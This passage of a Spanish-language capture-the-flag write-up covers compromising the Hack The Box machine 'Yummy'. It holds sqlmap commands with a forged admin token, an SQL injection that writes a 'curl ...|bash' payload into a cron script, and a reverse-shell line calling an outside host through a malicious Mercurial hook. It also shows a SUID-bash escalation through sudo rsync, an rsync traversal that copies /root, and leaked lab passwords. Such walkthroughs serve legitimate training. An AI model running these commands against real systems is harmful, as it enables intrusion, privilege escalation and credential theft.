sqlmap -u 'http://yummy.htb/admindashboard?o=' --cookie="X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjN2aWxzZWNAaHRiLmNvbSIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzQ0OTcwMzUxLCJleHAiOjE3NDQ5NzM5NTEsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTIxOTQ4MDQxMDU1NzEwODk5MTM5MTg5MjY3NDM2OTUzNTU4MDM4Nzc5NjI2NzU0NTY1Mjk2NjI1MTg5ODMyMzQ2NTI3ODM1MTY1Mzg0Njk4MDc1OTE2Mjc2ODkzNTI2MDM2NDE3NzQ3MTAxMDA2NDE4NzUyODc1NTQ0NTMxNDYxMDcxMDUyNTA4MTk5NjExNDU5NjAzNzY1NzQwNTQ2ODI4NjA3NjcxOTcwMjUxNjcxMTIwNTYyOTI5OTUyMTM4NTIyNzA5ODY4NTI5Njc5NTE0Njg4NTcwOTMzOTczMTkwODEzMDQ1NzM2NzY0NTY2NjY5MzQ5ODgzOTI1Mzc3MzI4Mjg5MDQ1NDU1ODQyMTE2Mzc4NDk1NjE3MzM0NjA5MDgwMDY4NzQ4OTQ3NTM2NjQxMzM3ODI4NTA3IiwiZSI6NjU1Mzd9fQ.AgG3exS-tRiNy69rDkUh8Mpy3_VotpVC1PvpoMfMBCKz8l15GTaBOU28X9AtSbllbIqkqM6vQA2QQdoprbKh-3hEpZgMt0rW0-lZ4u2z9FqZMYXE2sTQoCJtNxlh7n7bPsbyWpWniGFckwK8GfwcvQezLjSWkjVnZuo8sxH1PQFVHNM" --file-write="fixer-v666" --file-dest="/data/scripts/fixer-v666" --batch

sqlmap -u 'http://yummy.htb/admindashboard?o=' --cookie="X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6IjN2aWxzZWNAaHRiLmNvbSIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzQ0OTcwMzUxLCJleHAiOjE3NDQ5NzM5NTEsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTIxOTQ4MDQxMDU1NzEwODk5MTM5MTg5MjY3NDM2OTUzNTU4MDM4Nzc5NjI2NzU0NTY1Mjk2NjI1MTg5ODMyMzQ2NTI3ODM1MTY1Mzg0Njk4MDc1OTE2Mjc2ODkzNTI2MDM2NDE3NzQ3MTAxMDA2NDE4NzUyODc1NTQ0NTMxNDYxMDcxMDUyNTA4MTk5NjExNDU5NjAzNzY1NzQwNTQ2ODI4NjA3NjcxOTcwMjUxNjcxMTIwNTYyOTI5OTUyMTM4NTIyNzA5ODY4NTI5Njc5NTE0Njg4NTcwOTMzOTczMTkwODEzMDQ1NzM2NzY0NTY2NjY5MzQ5ODgzOTI1Mzc3MzI4Mjg5MDQ1NDU1ODQyMTE2Mzc4NDk1NjE3MzM0NjA5MDgwMDY4NzQ4OTQ3NTM2NjQxMzM3ODI4NTA3IiwiZSI6NjU1Mzd9fQ.AgG3exS-tRiNy69rDkUh8Mpy3_VotpVC1PvpoMfMBCKz8l15GTaBOU28X9AtSbllbIqkqM6vQA2QQdoprbKh-3hEpZgMt0rW0-lZ4u2z9FqZMYXE2sTQoCJtNxlh7n7bPsbyWpWniGFckwK8GfwcvQezLjSWkjVnZuo8sxH1PQFVHNM" --file-write="dbstatus.json" --file-dest="/data/scripts/dbstatus.json" --batch

```

y finalmente despues de 1 minuto:
<img src="/images/writeup-yummy/Pasted image 20250418123804.png" alt="image">

algo interesante, es que podemos hacer el mismo procedimiento sin sqlmap pero con burpsuite con:
```bash
http://yummy.htb/admindashboard/o?=some;SELECT "curl 10.10.10.10/3vilsec.sh|bash" INTO OUTFILE "/data/scripts/fixer-v999999";SELECT "active" INTO OUTFILE "/data/scripts/dbstatus.json";-- -
```

porque este comando igualmente esta alcanzando a escribir en los archivos del sistema, y en parte puede ser mas silecioso que sqlmap

luego dentro de la maquina, intentente el tratamiento clasico de la tty pero se corrompia la terminal (en 3 ocasiones asi que decidí continuar con esta pseudo terminal)

bueno, veo que no puedo ir por la flag de usuario, asi que debemos hacer movimiento lateral hacia otro usuario

enumerando y viendo un poco las carpetas encontré que en  /data/scripts (donde estaba el dbmonito.sh) ademas de que alli se almacenan los archivos que habiamos manipulado.


## Shell como www-data:

volviendo a las tareas cron, podemos confirmar que www-data esta ejecutando app_backup.sh cada minuto que es el mismo que esta en el directorio y aunque no podemos modificar el archivo directamente, podemos mover el existente y crear uno con el mismo nombre dado que los permisos del directorio nos lo permite:
```bash
mysql@yummy:/data/scripts$ ls -la
ls -la
total 32
drwxrwxrwx 2 root root 4096 Apr 18 12:05 .
drwxr-xr-x 3 root root 4096 Sep 30  2024 ..
-rw-r--r-- 1 root root   90 Sep 26  2024 app_backup.sh
-rw-r--r-- 1 root root 1336 Sep 26  2024 dbmonitor.sh
-rw-r----- 1 root root   60 Apr 18 12:05 fixer-v1.0.1.sh
-rw-r--r-- 1 root root 5570 Sep 26  2024 sqlappointments.sql
-rw-r--r-- 1 root root  114 Sep 26  2024 table_cleanup.sh

```

al cambiar el nombre del archivo, note que se creaba uno nuevo a los minutos, entonces lo que hice fue en mi maquina kali tener un archivo con una reverse shell y levantar un servidor python, y ejecutar desde la maquina comprometida el comando:
```
mv app_backup.sh bad_backup.sh | curl 10.10.10.10/app_backup.sh -O app_backup.sh
```

por supuesto, estaba escuchando con netcat en mi maquina y:
<img src="/images/writeup-yummy/Pasted image 20250418155717.png" alt="image">

somos www-data

vemos que nuestro home es /root/ pero al intentar enumerar no nos deja, algo bastante raro (porque no deberia ser el home del usuario) puede ser por la revshell.

cuando llega la alerta de mail dice que esta en:
/var/mail/www-data

asi vamos alla, y comienzo a enumerar un poco, veo que hay un directorio con el nombre de uno de los usuarios que tiene un home valido en /home *qa*

si entramos y enumeramos:

<img src="/images/writeup-yummy/Pasted image 20250418160747.png" alt="image">

parece incluso mi home, me llama mucho la atención el directorio que no tenia en el backup que descargamos (.hg)

si vamos dentro, vemos que parece un directorio .git:
<img src="/images/writeup-yummy/Pasted image 20250418160958.png" alt="image">

al investigar es una herramienta llamada *Mercurial* (dato: hg es el mismo símbolo del mercurio en la tabla periódica de elementos)
https://www.mercurial-scm.org/

## Shell como qa:

esto me hace pensar que aquí pueden haber credenciales, dado que el backup no lo estaba guardando

bueno, si vemos tenemos branches:
```
hg branches
```
<img src="/images/writeup-yummy/Pasted image 20250418162820.png" alt="image">

solo hay uno, si queremos mas info:
```bash
hg log -r 9 -v
```

el cambio fue echo por qa:

<img src="/images/writeup-yummy/Pasted image 20250418163023.png" alt="image">

si lo miramos:
```bash
hg log -r 9 -p
```
<img src="/images/writeup-yummy/Pasted image 20250418163153.png" alt="image">

tenemos unas credenciales **jPAd!XQCtn8Oc@2B** que no habíamos visto, asi que podemos intuir de quien son, voy a intentar iniciar como el usuario qa

aunque no me dejo usar el comando su y lo intente por ssh:
```
ssh qa@10.10.10.10
p: jPAd!XQCtn8Oc@2B
```
<img src="/images/writeup-yummy/Pasted image 20250418163643.png" alt="image">

y ahora si tenemos nuestra flag de usuario

mirando que comando puedo ejecutar con sudo -l:
<img src="/images/writeup-yummy/Pasted image 20250418171709.png" alt="image">

tenemos a mercurial de nuevo por aquí, aunque ahora nos dice que tenemos la capacidad de meter contenido nuevo a la aplicacion que se encuentra en /home/dev/app-producttion/

## Shell como dev:

esto me dice que posiblemente debemos intentar otra ejecución de un comando oculto o inyectar un comando a la hora de hacer el pull y conseguir que sea ejecutado como dev (dado que no tenemos acceso directo a /home/dev)

pasando este comando a nuestro llm fav, me da una pista que habla sobre que mercurial puede ejecutar hooks definidos en .hg/hgrc y cuando realizamos un hg pull podemos inyectar codigo malicioso

vamos a irnos a tmp:
```bash
cd /tmp/
mkdir exp && chmod 777 exp
cd exp && mkdir .hg && chmod 777 .hg
```
asegurandonos de que todo fuera siempre accesible

teniendo esto cree un comando malicioso para redirigir la ejecución del nuevo hook que vamos a inyectar:
```bash
echo 'sh -i >& /dev/tcp/10.10.14.193/9999 0>&1' > /tmp/3vil.sh
chmod 777 /tmp/3vil.sh
debe ser sh porque bash da problemas
```

ahora crearemos el hook malicioso:
```bash
echo -e "[hooks]\npre-pull.3vilsec = /tmp/3vil.sh" > /tmp/exp/.hg/hgrc
```

en nuestra maquina debemos tener un oyente nc:
```bash
nc -lnvp 443
```

finalmente ejecutamos:
```bash
sudo -u dev /usr/bin/hg pull /home/dev/app-production/
```
<img src="/images/writeup-yummy/Pasted image 20250418185901.png" alt="image">

xD *don't call me*

bueno voy al /home de dev para comenzar a enumerar

lo primero es ver nuestros permisos de ejecucion:
```bash
sudo -l

Matching Defaults entries for dev on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dev may run the following commands on localhost:
    (root : root) NOPASSWD: /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* /opt/app/
```

oh! ya tenemos algo interesante, tenemos capacidad de usar como sudo rsync para sincronizar archivos o directorios enteros, este comando lo hace con el parámetro *-a* (modo archivo: basicamente es un parámetro que resume r - l - p - t - g - o y d), en este blog encontramos mas detalles de esto:
https://www.linuxtotal.com.mx/index.php?cont=rsync-manual-de-uso

en resumen, mantiene los enlaces simbólicos y los replica en el destino (en este caso /opt/app), mantiene los permisos del origen

## Shell como Root:

lo que quise intentar fue copiar la bash, cambiarle los permisos a suid, y luego sincronizarlo en el directorio /opt/app al que tenemos acceso y allí simplemente ejecutar la bash con el parametro de privilegios. pero algo me esta dando problemas

cuando llega el archivo a /production/ dura poco tiempo antes de ser limpiado, aunque queda tiempo suficiente para ejecutar el siguiente comando:
```bash
cp /bin/bash /home/dev/app-production/3vil
chmod u+s /home/dev/app-production/3vil
```

el verdadero problema viene cuando ejecutamos el comando y ejecutamos la bash, el archivo deja de existir, pero si somos rápidos podemos mirar que alcanza a crearse son los suid:
```
sudo rsync -a --chown root:root --exclude\=.hg /home/dev/app-production/* /opt/app/
/opt/app/3vil -p
```
<img src="/images/writeup-yummy/Pasted image 20250419103901.png" alt="image">

aquí tiene que haber algún script que nos este limpiando esto antes de poder ejecutarlo (lo siento por la terminal, pero al parecer no me deja hacerle tratamiento a esta porque tambien se corrompe)

así que, he notado que puedo escribir los comando a ejecutar y pegarlos directo en la terminal para que se ejecuten en orden (como cuando copiamos y pegamos comandos de un repositorio)

pero si lo intento varias veces, tampoco me deja ejecutarlo:
<img src="/images/writeup-yummy/Pasted image 20250419104301.png" alt="image">

pero, mirando la imagen anterior, el comando -a no esta manteniendo como propietario a root en mi bash porque viene de la carpeta dev, entonces puede que esto este dando conflictos, porque no podemos escalar privilegios con un binario sin privilegios.
asi que investigando un poco, tambien podemos usar --chown para cambiarle los propietarios a todos los archivos dentro de /opt/app:

<img src="/images/writeup-yummy/Pasted image 20250419105624.png" alt="image">

con esto funcionando ahora vamos a ejecutar todos los comandos completos:

```
cp /bin/bash /home/dev/app-production/3vil
chmod u+s /home/dev/app-production/3vil
sudo rsync -a --exclude\=.hg /home/dev/app-production/* --chown root:root /opt/app/
/opt/app/3vil -p
```

y finalmente:
<img src="/images/writeup-yummy/Pasted image 20250419105805.png" alt="image">

hay una extraña condición de carrera combinado con el problema de la terminal que nos dificultaba la escalada final, ahora ya podemos ir por la id_rsa de root para una conexión mas estable

## Shell como Root(2):

tambien podríamos haber leído la flag de root con este método o ir por la id_rsa antes que hacer esto con el binario de bash

dado que al parecer por el asterisco, rsyn se vuelve muy laxo y deja que podamos viajar entre directorios y además inyectar comandos, le decimos que queremos que la copia del directorio root sea legible por dev y luego el comando --log-file va a despistar el sistema dado que nuestro comando debe terminar con /opt/app/, --log-file solo servirá para rellenar
```bash
sudo rsync -a --exclude\=.hg /home/dev/app-production/../../../../../root/ --chown dev:dev /tmp/backup --log-file /opt/app/
```
<img src="/images/writeup-yummy/Pasted image 20250419114113.png" alt="image">




## Scripts de la maquina:
están en /root/scritps:

el codigo encargado de limpiar y borrar la base de datos, (por eso debíamos registrarnos de nuevo en la pagina cada cierto tiempo)
table_cleanup.sh:
```bash
/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql
```

este es el código encargado de eliminar las reverse shell y los scripts maliciosos que cargamos con la inyección sql:
restorescript.sh
```bash
#!/bin/sh

/usr/bin/mysql -h localhost -u chef yummy_db -p'3wDo7gSRZIwIHRxZ!' < /data/scripts/sqlappointments.sql
cat restorescripts.sh
#!/bin/bash

MONITOR_DIR="/data/scripts/"
FILES_TO_WATCH=("dbmonitor.sh" "fixer-v1.0.1.sh" "sqlappointments.sql" "table_cleanup.sh")

# Ensure the directory exists
if [ ! -d "$MONITOR_DIR" ]; then
    /usr/bin/echo "The directory $MONITOR_DIR does not exist."
    exit 1
fi

# Monitor the directory for delete events
/usr/bin/inotifywait -m -e delete --format '%w%f %e' "$MONITOR_DIR" | while read fullpath event
do
    filename=$(/usr/bin/basename "$fullpath")
    for file in "${FILES_TO_WATCH[@]}"; do
        if [ "$filename" == "$file" ]; then
            /usr/bin/echo "The file $filename has been deleted."
            /usr/bin/cp /root/scripts/$filename /data/scripts/$filename
            /usr/bin/echo $filename restore
            break  # Exit the loop once a match is found
        fi
    done
done
```

este es el script que veia el app-backup.sh, que fue el que usamos para escalar privilegios de *qa* a *dev*:

haciendo monitoreo de eventos de creación para capturarlos y verificar si el valor mds5sum de ese archivo es igual al original, sino nos da los 5seg y restaura los archivos íntegros
restoreappbackup.sh
```bash
#!/bin/bash

MONITOR_DIR="/data/scripts"
FILE_TO_WATCH="app_backup.sh"
ORIGINAL="5abc61fab3b59c03de515a0122424166"
# Ensure the directory exists
if [ ! -d "$MONITOR_DIR" ]; then
    /usr/bin/echo "The directory $MONITOR_DIR does not exist."
    exit 1
fi

# Monitor the directory for create and delete events
/usr/bin/inotifywait -m -e create --format '%w%f %e' "$MONITOR_DIR" | while read fullpath event
do
    filename=$(/usr/bin/basename "$fullpath")
    if [ "$filename" == "$FILE_TO_WATCH" ]; then
        case "$event" in
            CREATE)
                /usr/bin/echo "The file $filename has been created."
                CURRENT=$(/usr/bin/md5sum /data/scripts/app_backup.sh | /usr/bin/awk '{print $1}')
                /usr/bin/sleep 2
                if [[ $CURRENT != $ORIGINAL ]]; then
                    /usr/bin/su -c '/bin/bash /data/scripts/app_backup.sh' -s /bin/bash www-data &
                fi
                /usr/bin/sleep 5
                /usr/bin/cp /root/scripts/app_backup.sh /data/scripts/app_backup.sh ; /usr/bin/chmod 644 /data/scripts/app_backup.sh ; /usr/bin/chown root:root /data/scripts/app_backup.sh
                /usr/bin/echo "$filename restored."
                ;;
            *)
                # Other events, if any, can be handled here
                ;;
        esac
    fi
done
```

este era el que limpiaba el directorio /app-production, pero aquí no da segundos, por ende tambien nos valimos de una condición de carrera contra el sistema para ejecutar nuestra bash SUID antes de que este se ejecute:
dev-app-cleanup.sh:
```bash
#!/bin/bash

# Directory to delete and restore
APP_DIR="/home/dev/app-production"
ZIP_FILE="/root/scripts/yummy-dev-app.zip"

# Delete the /home/dev/app-production directory
if [ -d "$APP_DIR" ]; then
    /usr/bin/echo "Deleting the directory $APP_DIR"
    /usr/bin/rm -rf "$APP_DIR"
else
    /usr/bin/echo "$APP_DIR does not exist."
fi

/usr/bin/mkdir "$APP_DIR"
cd "$APP_DIR"
/usr/bin/unzip -o "$ZIP_FILE"
/usr/bin/chown -R dev:dev "$APP_DIR"
```

aquí tambien vemos que este hace limpieza y restauración de los últimos directorios que usamos para escalar privilegios (detalle: al final del script, trata tambien los permisos y los restaura)

keep-app-integrity.sh:
```bash
#!/bin/bash

# Directory to delete and restore
APP_DIR="/home/dev/app-production"
ZIP_FILE="/root/scripts/yummy-dev-app.zip"

# Delete the /home/dev/app-production directory
if [ -d "$APP_DIR" ]; then
    /usr/bin/echo "Deleting the directory $APP_DIR"
    /usr/bin/rm -rf "$APP_DIR"
else
    /usr/bin/echo "$APP_DIR does not exist."
fi

/usr/bin/mkdir "$APP_DIR"
cd "$APP_DIR"
/usr/bin/unzip -o "$ZIP_FILE"
/usr/bin/chown -R dev:dev "$APP_DIR"
root@yummy:~/scripts# cat keep-app-integrity.sh
#!/bin/bash

# Directory to monitor
MONITOR_DIR="/opt/app"
interval=10  # sleep 10 seconds before restoration

# Ensure the directory exists
if [ ! -d "$MONITOR_DIR" ]; then
    /usr/bin/echo "The directory $MONITOR_DIR does not exist."
    exit 1
fi

# Monitor the directory for any operations (modify, create, delete)
/usr/bin/inotifywait -m -e modify,create,delete --format '%w%f %e' "$MONITOR_DIR" | while read fullpath event
do
    /usr/bin/sleep $interval
    /usr/bin/echo "Detected $event on $fullpath"
    # Removing and Restoring the webapp
    cd /opt/app/
    /usr/bin/rm -rf *
    /usr/bin/unzip -o /root/scripts/yummy-app.zip
    /usr/bin/chown -R root:root /opt/app/*
    /usr/bin/chown root:www-data /opt/app
    /usr/bin/echo "Fixed permissions"

    # Ensure the owner is set back to root
    /usr/bin/chown root:root "$file"

    /usr/bin/echo "Fixed permissions."

done

```

-----------------------
## Conclusiones:

Esta maquina simula escenarios del mundo real (aunque sea un ctf), en los cuales tenemos que combinar varias vulnerabilidades encadenadas para comprometer un sistema.
En la escalada de privilegios, destaca el enfoque en los permisos de comandos especiales y herrores de configuracion.

-------------------------


nos vemos en la siguiente maquina! 

## H4ck th3 W0rld

<img src="/images/devil.jpg" style="border-radius:200px; width:100px;" alt="image">